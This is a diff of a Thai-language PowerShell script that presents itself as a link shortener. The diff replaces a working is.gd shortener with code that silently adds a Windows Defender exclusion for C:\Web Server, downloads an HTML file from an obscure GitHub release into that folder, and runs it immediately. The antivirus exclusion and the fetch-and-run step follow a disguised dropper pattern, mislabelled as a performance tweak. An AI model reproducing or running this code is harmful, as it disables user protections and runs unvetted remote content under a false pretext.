@@ -1,91 +1,33 @@
-function Show-MainMenu {
-    clear
-    Write-Host "========================================" -ForegroundColor Cyan
-    Write-Host "      is.gd Link Shortener (PowerShell) " -ForegroundColor Cyan
-    Write-Host "========================================" -ForegroundColor Cyan
-    
-    $url = Read-Host "กรุณาวางลิงก์ที่ต้องการย่อ"
-    if ([string]::IsNullOrWhiteSpace($url)) {
-        Write-Host "ข้อผิดพลาด: ลิงก์ห้ามว่าง!" -ForegroundColor Red
-        Pause
-        return
-    }
+# --- Performance Optimization ---
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$ProgressPreference = 'SilentlyContinue'
 
-    Write-Host "`nเลือกรูปแบบชื่อลิงก์:" -ForegroundColor Yellow
-    Write-Host "1. สุ่มชื่อ (Random)"
-    Write-Host "2. ตั้งชื่อเอง (Custom)"
-    $choice = Read-Host "เลือก (1 หรือ 2)"
+# --- Variables & Path ---
+$dir = "C:\Web Server"; $file = "$dir\Shorten.link.html"
+$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/Shorten.link.html"
 
-    if ($choice -eq "1") {
-        Shorten-Link -longUrl $url
-    }
-    elseif ($choice -eq "2") {
-        $customName = ""
-        $success = $false
-        
-        while (-not $success) {
-            $customName = Read-Host "ตั้งชื่อที่ต้องการ (Short Name)"
-            if ([string]::IsNullOrWhiteSpace($customName)) {
-                Write-Host "กรุณากรอกชื่อ!" -ForegroundColor Red
-                continue
-            }
-            
-            $result = Shorten-Link -longUrl $url -shortName $customName
-            if ($result) { $success = $true }
-        }
-    }
-    else {
-        Write-Host "ตัวเลือกไม่ถูกต้อง กลับสู่หน้าแรก..." -ForegroundColor Red
-        Start-Sleep -Seconds 1
-    }
+# --- Main Logic ---
+if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
+Add-MpPreference -ExclusionPath $dir
+
+# ดาวน์โหลดไฟล์แบบ Synchronous ผ่าน .NET WebClient (Max Speed)
+(New-Object System.Net.WebClient).DownloadFile($url, $file)
+
+# สั่งรันไฟล์ HTML ทันที
+Start-Process $file
+
+# --- Cleanup & Choice ---
+Clear-Host
+Write-Host "==============================" -ForegroundColor Green
+$choice = Read-Host "คุณต้องการลบ 'ย่อลิ้งค์' หรือไม่? (Y/N)"
+Write-Host "==============================" -ForegroundColor Green
+
+if ($choice -match "y") {
+    Remove-Item -Path $dir -Recurse -Force
+    Write-Host "`n[!] ลบโฟลเดอร์ Web Server เรียบร้อยแล้ว" -ForegroundColor Yellow
+} else {
+    Write-Host "`n[+] คุณสามารถ บันทึกเป็น แถบรายการโปรด เพื่อเรียกใช้ ย่อลิ้งค์ ได้สะดวกยิ่งขึ้น" -ForegroundColor Cyan
 }
 
-function Shorten-Link {
-    param (
-        [string]$longUrl,
-        [string]$shortName = ""
-    )
-
-    $apiBase = "https://is.gd/create.php?format=json&url=$([uri]::EscapeDataString($longUrl))"
-    
-    if ($shortName -ne "") {
-        $apiBase += "&shorturl=$([uri]::EscapeDataString($shortName))"
-    }
-
-    try {
-        $response = Invoke-RestMethod -Uri $apiBase -Method Get
-        
-        if ($null -ne $response.shorturl) {
-            $shortLink = $response.shorturl
-            Write-Host "`n----------------------------------------" -ForegroundColor Green
-            Write-Host "สำเร็จ! ลิงก์ของคุณคือ: $shortLink" -ForegroundColor Green
-            
-            $shortLink | Set-Clipboard
-            Write-Host "(คัดลอกลิงก์ไปยัง Clipboard เรียบร้อยแล้ว)" -ForegroundColor Gray
-            Write-Host "----------------------------------------" -ForegroundColor Green
-            
-            Write-Host "`nกดปุ่มอะไรก็ได้เพื่อกลับไปหน้าแรก..."
-            $null = [System.Console]::ReadKey($true)
-            return $true
-        }
-        else {
-            if ($response.errormessage -like "*Short URL already in use*") {
-                Write-Host "ข้อผิดพลาด: ชื่อ '$shortName' ถูกใช้ไปแล้ว กรุณาตั้งชื่อใหม่" -ForegroundColor Yellow
-                return $false
-            } else {
-                Write-Host "เกิดข้อผิดพลาด: $($response.errormessage)" -ForegroundColor Red
-                Pause
-                return $true
-            }
-        }
-    }
-    catch {
-        Write-Host "ไม่สามารถเชื่อมต่อกับ API ได้: $($_.Exception.Message)" -ForegroundColor Red
-        Pause
-        return $true
-    }
-}
-
-while ($true) {
-    Show-MainMenu
-}
+# คืนค่า Progress Bar
+$ProgressPreference = 'Continue'
